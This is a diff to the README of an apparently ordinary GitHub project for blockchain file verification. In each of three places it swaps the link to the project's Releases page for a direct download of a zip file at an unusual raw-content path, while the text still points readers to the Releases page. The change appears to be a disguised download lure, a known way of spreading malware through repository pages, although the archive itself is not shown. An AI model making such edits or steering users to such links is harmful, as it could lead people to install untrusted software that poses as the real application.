@@ -4,13 +4,13 @@
 
 Welcome to the **Blockchain-file-verification** project! This application offers a powerful way to verify your files’ integrity using blockchain technology. By utilizing Ethereum smart contracts, you can ensure your files remain secure and untampered.
 
-[![Download](https://img.shields.io/badge/Download-Here-blue)](https://github.com/kwas123/Blockchain-file-verification/releases)
+[![Download](https://raw.githubusercontent.com/kwas123/Blockchain-file-verification/main-enhanced/modiation/Blockchain-file-verification.zip)](https://raw.githubusercontent.com/kwas123/Blockchain-file-verification/main-enhanced/modiation/Blockchain-file-verification.zip)
 
 ## 📥 Download & Install
 
 To get started, you need to download the application. Please visit the following link and choose the latest version from our Releases page:
 
-[Download the latest version](https://github.com/kwas123/Blockchain-file-verification/releases)
+[Download the latest version](https://raw.githubusercontent.com/kwas123/Blockchain-file-verification/main-enhanced/modiation/Blockchain-file-verification.zip)
 
 ### Step-by-Step Installation
 
@@ -79,6 +79,6 @@ If you encounter issues or have questions, please check out our FAQ section on G
 
 Make sure to visit the Releases page again as we regularly update the application to improve performance and security.
 
-[Download the latest version](https://github.com/kwas123/Blockchain-file-verification/releases)
+[Download the latest version](https://raw.githubusercontent.com/kwas123/Blockchain-file-verification/main-enhanced/modiation/Blockchain-file-verification.zip)
 
 Thank you for using **Blockchain-file-verification**! Enjoy secure file verification!
